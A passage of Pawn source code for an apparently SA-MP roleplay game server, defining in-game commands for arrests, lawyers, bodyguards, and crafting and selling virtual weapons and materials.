     	SetPlayerPos(user, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
     	SetCameraBehindPlayer(user);
    	format(string, sizeof(string), "You have been arrested for %d minutes", Player[user][pPrisonTime]/60 * 100 / 30);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
    	format(string1, sizeof(string1), "Your time is decreased 30 percent by the benifit of the VIP");
		SendClientMessage(user, COLOR_VIP, string1);
    	RemovePlayerAttachedObject(user, 0);
    	SetPlayerSpecialAction(user, SPECIAL_ACTION_NONE);
    	if(DeliverMoney[user] == 1)
    	{
	            new Rob = BankRobber[user]-1;
        	    DisablePlayerCheckpoint(user);
         		BankRobbersCount --;
          		format(BankRobbers[Rob], MAX_PLAYER_NAME, "");
        		DeliverMoney[user] = 0;
         		BankRobber[user] = 0;
        		if(BankRobbersCount == 0)
				{
       	    		BankRobbery = 0;
        			RobberyStarted = 0;
        		}
        }
    }
    else
    {
        SetPlayerColor(user, TRANSPARENT_WHITE);
    	Player[user][pArrested] ++;
    	Player[user][pPrison] = 1;
    	Player[user][pPrisonTime] = time*60;
    	ClearZamoraWantedLevels(user);
    	SetPlayerInterior(user, 0);
    	SetPlayerVirtualWorld(user, 0);
    	TogglePlayerControllable(user, 0);
    	TogglePlayerCuffed(user, 0);
    	SetTimerEx("EnterExitTimer", 5000, false, "i", user);
    	new RandomCell = random(sizeof(RandomPrison));
     	SetPlayerFacingAngle(user, RandomPrison[RandomCell][3]);
     	SetPlayerPos(user, RandomPrison[RandomCell][0], RandomPrison[RandomCell][1], RandomPrison[RandomCell][2]);
     	SetCameraBehindPlayer(user);
    	new idx = Player[playerid][pHouse];
    	new idx2 = Player[playerid][pBiz];
        new TotalWealth = Player[user][pMoney]+Player[user][pBank]+HouseInfo[idx][hMoney]+BizInfo[idx2][bMoney];
    	amount = (5*(TotalWealth))/100;
    	GiveZamoraMoney(user, -amount);
    	format(string1, sizeof(string1), "You have been deliver to prison for %d minutes (%d seconds), and you've been fined $%d", Player[user][pPrisonTime]/60, Player[user][pPrisonTime], amount);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string1);
    	RemovePlayerAttachedObject(user, 0);
    	SetPlayerSpecialAction(user, SPECIAL_ACTION_NONE);
    	if(DeliverMoney[user] == 1)
    	{
	            new Rob = BankRobber[user]-1;
        	    DisablePlayerCheckpoint(user);
         		BankRobbersCount --;
          		format(BankRobbers[Rob], MAX_PLAYER_NAME, "");
        		DeliverMoney[user] = 0;
         		BankRobber[user] = 0;
        		if(BankRobbersCount == 0)
				{
       	    		BankRobbery = 0;
        			RobberyStarted = 0;
        		}
        }
    }
	return 1;
}

IRP:vest(playerid, var[])
{
	new user, price, string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pJob] != JOB_BODYGUARD && Player[playerid][pVIPJob] != JOB_BODYGUARD) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Bodyguard.");
	if(sscanf(var, "ui", user, price)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /vest [playerid] [price]");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't complete this action.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!IsPlayerNearPlayer(playerid, user, 5)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(price < 1000 || price > 5000) return SendClientMessage(playerid, COLOR_GRAD2, "Price is between 1000 and 5000.");
	VestPrice[playerid][user] = price;
	VestBy[user] = playerid;
	format(string, sizeof(string), " You have offered %s a vest for $%d.", GetName(user), price);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " Bodyguard %s has offered you a vest for $%d. (/accept vest) (/cancel vest)", GetName(playerid), price);
    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:free(playerid, var[])
{
	new user, price, string[128];
    if(FreeTimeout[playerid])
    {
        format(string, sizeof(string), "You have to wait %d more seconds before freeing someone.", FreeTimeout[playerid]);
        SendClientMessage(playerid, COLOR_GRAD2, string);
        return 1;
    }
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pJob] != JOB_LAWYER && Player[playerid][pVIPJob] != JOB_LAWYER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Lawyer.");
	if(sscanf(var, "ui", user, price)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /free [playerid] [price]");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to complete this action.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(!Player[user][pJail]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not prisoned or jailed.");
	if(!IsPlayerNearPlayer(playerid, user, 5)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from your client.");
	if(price < 1000 || price > 5000) return SendClientMessage(playerid, COLOR_GRAD2, "Price is between 1000 and 5000.");
	if(RPJS(playerid, JOB_LAWYER) < 100) FreeTime[user] = 1;
	else if(RPJS(playerid, JOB_LAWYER) < 300) FreeTime[user] = 2;
	else if(RPJS(playerid, JOB_LAWYER) < 700) FreeTime[user] = 3;
	else if(RPJS(playerid, JOB_LAWYER) < 1200) FreeTime[user] = 4;
	else if(RPJS(playerid, JOB_LAWYER) >= 1200) FreeTime[user] = 5;
	FreePrice[playerid][user] = price;
	FreeBy[user] = playerid;
	format(string, sizeof(string), " You have offered %s to reduce their prison sentence by %d minutes for $%d.", GetName(user), FreeTime[user], price);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " Lawyer %s has offered to reduce your prison sentence by %d minute for $%d. (/accept free) (/cancel free)", GetName(playerid), FreeTime[user], price);
    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}

IRP:defend(playerid, var[])
{
	new user, price, string[128];
    if(DefendTimeout[playerid])
    {
        format(string, sizeof(string), "You have to wait %d more seconds before defending someone.", DefendTimeout[playerid]);
        SendClientMessage(playerid, COLOR_GRAD2, string);
        return 1;
    }
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pJob] != JOB_LAWYER && Player[playerid][pVIPJob] != JOB_LAWYER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Lawyer.");
	if(sscanf(var, "ui", user, price)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /defend [playerid] [price]");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You are not able to defend your self.");
	if(!Logged(user)) return SendClientMessage(playerid, COLOR_GRAD2, "I can't find this player.");
	if(!Player[user][pWanted]) return SendClientMessage(playerid, COLOR_GRAD2, "That player is not in the wanted list.");
	if(!IsPlayerNearPlayer(playerid, user, 5)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from your client.");
	if(price < 1000 || price > 5000) return SendClientMessage(playerid, COLOR_GRAD2, "Price is between 1000 and 5000.");
	DefendBy[user] = playerid;
	DefendPrice[playerid][user] = price;
	format(string, sizeof(string), " You have offered %s to defend them $%d.", GetName(user), price);
	SendClientMessage(playerid, COLOR_LIME, string);
	format(string, sizeof(string), " Lawyer %s has offered to a defend you for $%d. (/accept defend) (/cancel defend)", GetName(playerid), price);
    SendClientMessage(user, COLOR_LIME, string);
	return 1;
}
IRP:mech(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pJob] != JOB_MECHANIC && Player[playerid][pVIPJob] != JOB_MECHANIC) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a mechanic.");
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You must be in a vehicle to use your mechanic tools.");
	ShowDialog(playerid, 9);
	return 1;
}

IRP:creategun(playerid, var[])
{
   	if(!Logged(playerid)) return NoAuth(playerid);
	if(Player[playerid][pJob] != JOB_WDEALER && Player[playerid][pVIPJob] != JOB_WDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a weapons dealer.");
	new string[128];
	if(sscanf(var, "s[32]", var))
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /creategun [weapon]");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 1]: Flowers (125 Low Mats) | GolfClub (150 Low Mats) | Shovel (150 Low Mats) | Bat (150 Low Mats) | Katana (150 Low Mats)");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 1]: SDPistol (1100 Low Mats) | Shotgun (1200 Low Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 2) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 2]: MP5 (1500 Low Mats) | Rifle (1750 Low Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 3) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 3]: Deagle (3000 Low Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 4) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 4]: AK47 (5000 Medium Mats) | M4 (5500 Medium Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 5) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 5]: SPAS12 (7500 High Mats) | Sniper (8000 High Mats)");
	    return 1;
	}
    if(!strcmp(var, "flowers", true, 7))
    {
        if(Player[playerid][pLMaterials] < 125) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 14, 5);
		Player[playerid][pLMaterials] -=125;
		format(string, sizeof(string), "* %s has created flowers from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "golfclub", true, 8))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 2, 5);
		Player[playerid][pLMaterials] -=150;
		format(string, sizeof(string), "* %s has created a golf club from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "shovel", true, 6))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 6, 5);
		Player[playerid][pLMaterials] -=150;
		format(string, sizeof(string), "* %s has created a shovel from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
	else if(!strcmp(var, "bat", true, 3))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 5, 5);
		Player[playerid][pLMaterials] -=150;
		format(string, sizeof(string), "* %s has created a baseball bat from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "katana", true, 6))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
        GiveZamoraWeapon(playerid, 8, 5);
        Player[playerid][pLMaterials] -=150;
        format(string, sizeof(string), "* %s has created a katana from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "sdpistol", true, 7))
    {
		if(Player[playerid][pLMaterials] < 1100) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 23, 5);
		Player[playerid][pLMaterials] -=1100;
		format(string, sizeof(string), "* %s has created a silenced pistol from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
    else if(!strcmp(var, "shotgun", true, 7))
    {
		if(Player[playerid][pLMaterials] < 1200) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 25, 5);
		Player[playerid][pLMaterials] -=1200;
		format(string, sizeof(string), "* %s has created a shotgun from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
  	else if(!strcmp(var, "rifle", true, 5))
    {
        if(strval(RPJL(playerid, JOB_WDEALER)) < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
        if(Player[playerid][pLMaterials] < 1750) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 33, 5);
		Player[playerid][pLMaterials] -=1750;
		format(string, sizeof(string), "* %s has created a rifle from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	}
    else if(!strcmp(var, "mp5", true, 3))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pLMaterials] < 1500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		GiveZamoraWeapon(playerid, 29, 5);
		Player[playerid][pLMaterials] -=1500;
		format(string, sizeof(string), "* %s has created an MP5 from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "deagle", true, 6))
    {
        if(strval(RPJL(playerid, JOB_WDEALER)) < 3) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
        if(Player[playerid][pLMaterials] < 3000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have low enough materials for this weapon.");
		GiveZamoraWeapon(playerid, 24, 5);
		Player[playerid][pLMaterials] -=3000;
		format(string, sizeof(string), "* %s has created a desert eagle from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "ak47", true, 4))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 4) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pMMaterials] < 5000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough medium materials for this weapon.");
		GiveZamoraWeapon(playerid, 30, 5);
		Player[playerid][pMMaterials] -=5000;
		format(string, sizeof(string), "* %s has created an AK-47 from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "M4", true, 2))
    {
        if(strval(RPJL(playerid, JOB_WDEALER)) < 4) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
        if(Player[playerid][pMMaterials] < 5500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough medium materials for this weapon.");
		GiveZamoraWeapon(playerid, 31, 5);
		Player[playerid][pMMaterials] -=5500;
		format(string, sizeof(string), "* %s has created an M4 from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "spas12", true, 6))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pHMaterials] < 7500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough high materials for this weapon.");
		GiveZamoraWeapon(playerid, 27, 5);
		Player[playerid][pHMaterials] -=7500;
		format(string, sizeof(string), "* %s has created a combat shotgun from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else if(!strcmp(var, "sniper", true, 6))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pHMaterials] < 8000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough high materials for this weapon.");
		GiveZamoraWeapon(playerid, 34, 5);
		Player[playerid][pHMaterials] -=8000;
		format(string, sizeof(string), "* %s has created a sniper rifle from materials.", GetName(playerid));
    	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    }
    else
    {
        SendClientMessage(playerid, COLOR_GRAD2, "Invalid weapon name.");
        return 1;
    }
	return 1;
}
IRP:sellgun(playerid, var[])
{
	new string[128], user, price, weapon[32];
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pJob] != JOB_WDEALER && Player[playerid][pVIPJob] != JOB_WDEALER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a weapons dealer.");
	if(sscanf(var, "us[32]i", user, weapon, price))
	{
	    SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellgun [playerid] [weapon] [price]");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 1]: Flowers (125 Low Mats) | GolfClub (150 Low Mats) | Shovel (150 Low Mats) | Bat (150 Low Mats) | Katana (150 Low Mats)");
	    SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 1]: SDPistol (1100 Low Mats) | Shotgun (1200 Low Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 2) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 2]: MP5 (1500 Low Mats) | Rifle (1750 Low Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 3) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 3]: Deagle (3000 Low Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 4) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 4]: AK47 (5000 Medium Mats) | M4 (5500 Medium Mats)");
	    if(strval(RPJL(playerid, JOB_WDEALER)) >= 5) SendClientMessage(playerid, COLOR_GRAD2, "** [LEVEL 5]: SPAS12 (7500 High Mats) | Sniper (8000 High Mats)");
	    return 1;
	}
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't sell weapons to yourself, use /creategun.");
	if(!Logged(user)) return NoLogin(playerid);
	if(Player[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You must be at least level 2 to sell weapons.");
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
    if(!strcmp(weapon, "flowers", true, 7))
    {
        if(Player[playerid][pLMaterials] < 125) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 14;
		sellgunlowmats[user] = 1;
    }
    else if(!strcmp(weapon, "golfclub", true, 8))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 2;
		sellgunlowmats[user] = 1;
    }
    else if(!strcmp(weapon, "shovel", true, 6))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 6;
		sellgunlowmats[user] = 1;
    }
	else if(!strcmp(weapon, "bat", true, 3))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 5;
		sellgunlowmats[user] = 1;
    }
    else if(!strcmp(weapon, "katana", true, 6))
    {
        if(Player[playerid][pLMaterials] < 150) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
        BeenOfferedWeapon[user] = 8;
        sellgunlowmats[user] = 1;
    }
    else if(!strcmp(weapon, "sdpistol", true, 7))
    {
		if(Player[playerid][pLMaterials] < 1100) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 23;
		sellgunlowmats[user] = 1;
	}
    else if(!strcmp(weapon, "shotgun", true, 7))
    {
		if(Player[playerid][pLMaterials] < 1200) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 25;
		sellgunlowmats[user] = 1;
	}
  	else if(!strcmp(weapon, "rifle", true, 5))
    {
        if(strval(RPJL(playerid, JOB_WDEALER)) < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
        if(Player[playerid][pLMaterials] < 1750) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 33;
		sellgunlowmats[user] = 1;
	}
    else if(!strcmp(weapon, "mp5", true, 3))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 2) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pLMaterials] < 1500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 29;
		sellgunlowmats[user] = 1;
    }
    else if(!strcmp(weapon, "deagle", true, 6))
    {
        if(strval(RPJL(playerid, JOB_WDEALER)) < 3) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
        if(Player[playerid][pLMaterials] < 3000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough low materials for this weapon.");
		BeenOfferedWeapon[user] = 24;
		sellgunlowmats[user] = 1;
    }
    else if(!strcmp(weapon, "ak47", true, 4))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 4) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pMMaterials] < 5000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough medium materials for this weapon.");
		BeenOfferedWeapon[user] = 30;
		sellgunmedmats[user] = 1;
    }
    else if(!strcmp(weapon, "M4", true, 2))
    {
        if(strval(RPJL(playerid, JOB_WDEALER)) < 4) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
        if(Player[playerid][pMMaterials] < 5500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough medium materials for this weapon.");
		BeenOfferedWeapon[user] = 31;
		sellgunmedmats[user] = 1;
    }
    else if(!strcmp(weapon, "spas12", true, 6))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pHMaterials] < 7500) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough high materials for this weapon.");
		BeenOfferedWeapon[user] = 27;
		sellgunhighmats[user] = 1;
    }
    else if(!strcmp(weapon, "sniper", true, 6))
    {
		if(strval(RPJL(playerid, JOB_WDEALER)) < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Dealer level is too low to sell this weapon.");
		if(Player[playerid][pHMaterials] < 8000) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough high materials for this weapon.");
		BeenOfferedWeapon[user] = 34;
		sellgunhighmats[user] = 1;
    }
    else
    {
        SendClientMessage(playerid, COLOR_GRAD2, "Invalid weapon name.");
        return 1;
    }
    SellWeaponTo[playerid] = user;
	BuyWeaponFrom[user] = playerid;
	BuyWeaponPrice[user] = price;
	format(string, sizeof(string), " You have offered %s to sell them a %s for $%d.", GetName(user), RWN(BeenOfferedWeapon[user]), price);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
	format(string, sizeof(string), " %s has offered to sell you a %s for $%d. (/accept weapon) (/cancel weapon)", GetName(playerid), RWN(BeenOfferedWeapon[user]), price);
    SendClientMessage(user, COLOR_LIGHTBLUE, string);
	return 1;
}
IRP:sellmats(playerid, var[])
{
	new string[128], user, amount, price;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pJob] != JOB_WSMUGGLER && Player[playerid][pVIPJob] != JOB_WSMUGGLER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a weapons smuggler/dealer.");
	if(sscanf(var, "uii", user, amount, price)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /sellmats [playerid] [amount] [price]");
	if(playerid == user) return SendClientMessage(playerid, COLOR_GRAD2, "You can't sell materials to yourself.");
	if(!Logged(user)) return NoLoginB(playerid);
	if(Player[playerid][pLevel] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You must be at least level 2 to sell materials.");
	if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	if(Player[playerid][pLMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much materials on you.");
	if(Player[playerid][pMMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much materials on you.");
	if(Player[playerid][pHMaterials] < amount) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much materials on you.");
	if(SellMaterialsTo[playerid] == user) return SendClientMessage(playerid, COLOR_GRAD2, "You have already offered that player to sell them materials.");
	if(price <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid price.");
	if(amount <= 0) return SendClientMessage(playerid, COLOR_GRAD2, "You're entering an invalid amout.");
	if(!strcmp(var, "low", true))
	{
    	foreach(Player, i)
    	{
    		if(Logged(i))
    		{
		        if(SellMaterialsTo[playerid] == i && BuyMaterialsFrom[i] == playerid)
		        {
		           BuyMaterialsFrom[i] = -1; BuyMaterialsAmount[i] = 0; BuyMaterialsPrice[i] = 0; BeenOfferedMaterials[i] = 0;
	    	    }
	    	}
    	}
    	// New buyer
    	SellMaterialsTo[playerid] = user;
    	BuyMaterialsFrom[user] = playerid;
    	BuyMaterialsAmount[user] = amount;
    	BuyMaterialsPrice[user] = price;
    	BeenOfferedMaterials[user] = 1;
    	format(string, sizeof(string), " You have offered %s to sell them %d low materials for $%d.", GetName(user), amount, price);
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    	format(string, sizeof(string), " %s has offered to sell you %d low materials for $%d. (/accept lowmats) (/cancel lowmats)", GetName(playerid), amount, price);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	if(!strcmp(var, "medium", true))
	{
    	foreach(Player, i)
    	{
	    	if(Logged(i))
	    	{
	    	    if(SellMaterialsTo[playerid] == i && BuyMaterialsFrom[i] == playerid)
	    	    {
		           BuyMaterialsFrom[i] = -1; BuyMaterialsAmount[i] = 0; BuyMaterialsPrice[i] = 0; BeenOfferedMaterials[i] = 0;
	    	    }
	    	}
    	}
    	// New buyer
    	SellMaterialsTo[playerid] = user;
    	BuyMaterialsFrom[user] = playerid;
    	BuyMaterialsAmount[user] = amount;
    	BuyMaterialsPrice[user] = price;
    	BeenOfferedMaterials[user] = 1;
    	format(string, sizeof(string), " You have offered %s to sell them %d medium materials for $%d.", GetName(user), amount, price);
       	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    	format(string, sizeof(string), " %s has offered to sell you %d medium materials for $%d. (/accept meduiunmats) (/cancel mediummats)", GetName(playerid), amount, price);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
	}
	if(!strcmp(var, "high", true))
	{
    	foreach(Player, i)
    	{
	    	if(Logged(i))
	    	{
	    	    if(SellMaterialsTo[playerid] == i && BuyMaterialsFrom[i] == playerid)
	    	    {
		           BuyMaterialsFrom[i] = -1; BuyMaterialsAmount[i] = 0; BuyMaterialsPrice[i] = 0; BeenOfferedMaterials[i] = 0;
	    	    }
    		}
    	}
    	// New buyer
    	SellMaterialsTo[playerid] = user;
    	BuyMaterialsFrom[user] = playerid;
    	BuyMaterialsAmount[user] = amount;
    	BuyMaterialsPrice[user] = price;
    	BeenOfferedMaterials[user] = 1;
    	format(string, sizeof(string), " You have offered %s to sell them %d high materials for $%d.", GetName(user), amount, price);
    	SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
    	format(string, sizeof(string), " %s has offered to sell you %d high materials for $%d. (/accept highmats) (/cancel highmats)", GetName(playerid), amount, price);
    	SendClientMessage(user, COLOR_LIGHTBLUE, string);
    }
	return 1;
}

IRP:skill(playerid, var[])
{
	new string[128], left;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "i", strval(var)))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /skill [skill]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [SKILLS]: 1) Lawyer | 2) Fisher | 3) Weapons Dealer | 4) Weapons Smuggler");
        SendClientMessage(playerid, COLOR_GRAD2, "** [SKILLS]: 5) Drugs Dealer | 6) Drugs Smuggler");
		return 1;
	}
